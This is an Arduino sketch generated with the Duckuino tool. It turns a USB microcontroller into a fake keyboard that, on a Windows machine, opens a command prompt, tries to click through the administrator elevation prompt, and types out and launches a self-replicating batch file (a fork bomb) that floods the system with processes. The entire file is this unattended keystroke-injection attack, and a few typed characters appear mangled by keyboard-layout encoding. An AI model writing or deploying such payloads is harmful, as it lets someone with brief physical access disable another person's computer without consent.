/**
 * Made with Duckuino, an open-source project.
 * Check the license at 'https://github.com/Nurrl/Duckuino/blob/master/LICENSE'
 */

#include "Keyboard.h"

void typeKey(uint8_t key)
{
  Keyboard.press(key);
  delay(50);
  Keyboard.release(key);
}

/* Init function */
void setup()
{
  // Begining the Keyboard stream


Keyboard.begin();

  // Wait 500ms
  delay(500);

  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  Keyboard.releaseAll();

  delay(200);
  Keyboard.print(F("CMD"));

  delay(500);
  typeKey(KEY_LEFT_CTRL);

  typeKey(KEY_LEFT_SHIFT);

  typeKey(KEY_RETURN);

  delay(500);
  typeKey(KEY_LEFT_ARROW);

  delay(200);
  typeKey(KEY_RETURN);

  delay(200);
  Keyboard.print(F("cd\334"));
  typeKey(KEY_RETURN);

  delay(200);
  Keyboard.print(F("md a"));
  typeKey(KEY_RETURN);     

  delay(200);
  Keyboard.print(F("cd a"));
  typeKey(KEY_RETURN);


  typeKey(KEY_RETURN);

  Keyboard.print(F("copy con a.bat"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("@echo off"));

  typeKey(KEY_RETURN);
  
  Keyboard.write(63);
  Keyboard.print(F("START"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("start a.bat"));

  typeKey(KEY_RETURN);

  Keyboard.print(F("GOTO START"));

  typeKey(KEY_RETURN);

  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.press('z');
  Keyboard.releaseAll();

  typeKey(KEY_RETURN);

  Keyboard.print(F("a.bat"));

  typeKey(KEY_RETURN);


  // Ending stream
  Keyboard.end();
}

/* Unused endless loop */
void loop() {}
